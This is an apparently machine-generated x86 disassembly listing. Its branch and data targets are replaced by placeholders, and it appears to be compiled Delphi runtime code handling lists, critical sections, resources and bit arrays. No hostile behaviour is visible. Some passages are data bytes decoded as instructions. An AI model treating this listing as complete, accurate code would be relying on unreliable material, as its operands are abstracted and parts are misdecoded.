mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_4132e0
xor eax eax
push ebp
push sub_4134f3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4134fa
mov eax [ rw-data ]
call sub_413398
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413de8
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413f44
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_412e1c
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413de8
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_413f44
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_4134fa
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_413520
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_413550
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_4132e0
xor edx edx
push ebp
push sub_4135c7
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_413398
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_403a90
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413f44
mov edx [ ebp - 0x4 ]
call sub_412dbc
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4135e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_413644
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41364b
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
sub_413650
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4132e0
xor eax eax
push ebp
push sub_413696
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413144
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41369d
mov eax [ rw-data ]
call sub_413398
retn
sub_4136a4
push ebx
push esi
mov esi eax
mov eax esi
call sub_413650
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_4135e4
sub_4136c4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4132e0
xor eax eax
push ebp
push sub_413729
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_413304
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4132ec
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413730
mov eax [ rw-data ]
call sub_413398
retn
mov eax ebx
call sub_4031e4
mov ebx eax
sub_413734
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4132e0
xor eax eax
push ebp
push sub_413776
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4133a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41377d
mov eax [ rw-data ]
call sub_413398
retn
sub_413780
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4132e0
xor eax eax
push ebp
push sub_4137c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_413348
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4137c9
mov eax [ rw-data ]
call sub_413398
retn
sub_4137cc
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_4132e0
xor eax eax
push ebp
push sub_413813
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_413218
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41381a
mov eax [ rw-data ]
call sub_413398
retn
sub_413820
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_4132e0
xor eax eax
push ebp
push sub_41386e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_412fe4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413875
mov eax [ rw-data ]
call sub_413398
retn
sub_4138d4
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40357c
pop ebp
retn 0x8
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_41390c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4138d4
mov edx eax
mov eax [ rw-data ]
call sub_414228
pop edi
pop esi
pop ebx
retn
sub_413938
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_4142b0
mov esi eax
xor edx edx
push ebp
push sub_4139a2
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_414314
retn
mov edx ebx
mov eax esi
call sub_413f44
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_403a90
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4139b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407d1c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4139f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403ffc
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413a38
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_413fa0
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_413de8
sub_413a90
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_413f44
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_413ad0
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_413a90
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_413af4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_404468
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41655c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_413b68
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_415f2c
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
sub_413b78
push ebx
call sub_405df4
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405df4
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_413de8
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov ebx eax
call sub_405df4
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov ebx eax
call sub_405df4
mov [ eax + 0xc ] ebx
sub_413bd0
push ebx
push esi
push edi
call sub_405df4
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_413f44
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_413c00
push ebx
push esi
call sub_405df4
mov eax [ eax + 0x8 ]
call sub_403258
call sub_405df4
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_41402c
mov esi eax
call sub_405df4
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_413e34
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405df4
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403258
sub_413c5c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_413cf2
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413cf9
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4031e4
call sub_413c5c
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031a8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40420c
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405070
call sub_4050c0
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_413af4
or bl al
sub_413d04
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_413db2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_413d93
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4031a0
call sub_413c5c
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413b78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413d9a
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_413bd0
retn
call sub_413c00
sub_413dc8
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_413de8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413e34
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413ed0
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4028b8
mov edx esi
mov eax ebx
call sub_413f44
mov edi eax
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_413e98
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_413e94
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
jmp sub_4039e4
sub_413ed0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_413f18
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_405b88
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f1f
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_413f44
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413ed0
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_413f6c
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_4140a8
retn
sub_413fa0
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_413fc0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413ed0
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
shl ecx 0x2
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4028b8
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_414038
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413ed0
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_414088
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_413fa0
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_413e34
sub_4140a8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413ed0
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
shl edx 0x2
lea eax [ ebx + 0x4 ]
call sub_4026fc
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_4140e4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_413ed0
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4140a8
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
shl eax 0x2
xor ecx ecx
xchg edx eax
call sub_402c64
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_413e34
dec ebp
inc edi
jne r-xdata
sub_414158
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax esi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_4141ac
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035e4
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4142b0
xor eax eax
push ebp
push sub_41420e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_403258
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403248
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414215
mov eax [ ebp - 0x4 ]
call sub_414314
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_414228
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4142b0
xor eax eax
push ebp
push sub_4142a4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413de8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413fa0
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4142ab
mov eax [ ebp - 0x4 ]
call sub_414314
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_413ed0
sub_4142c4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4142b0
xor eax eax
push ebp
push sub_414307
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_414088
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41430e
mov eax [ ebp - 0x4 ]
call sub_414314
retn
sub_414320
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414374
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_414374
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_414350
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026bc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402c64
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026dc
mov edx edi
mov eax ebp
call sub_414368
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028b8
sub_414418
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_414350
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_414374
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_41445c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_4144d4
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov eax esi
call sub_416cfc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_414514
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4145ca
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404040
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031a8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40420c
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031a8
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4145d1
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_4145f0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_414685
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_4031a8
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_40420c
mov eax ebx
mov si 0xffff
call sub_403454
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41468c
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax ebx
mov si 0xffff
call sub_403454
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403454
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_404328
sub_414697
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4034ac
mov eax ebx
mov si 0xffff
call sub_403454
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403454
push eax
lea eax [ ebx + 0x4 ]
call sub_4056c4
mov ecx eax
mov edx r-xdata
pop eax
call sub_40330c
sub_4146e2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_414714
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
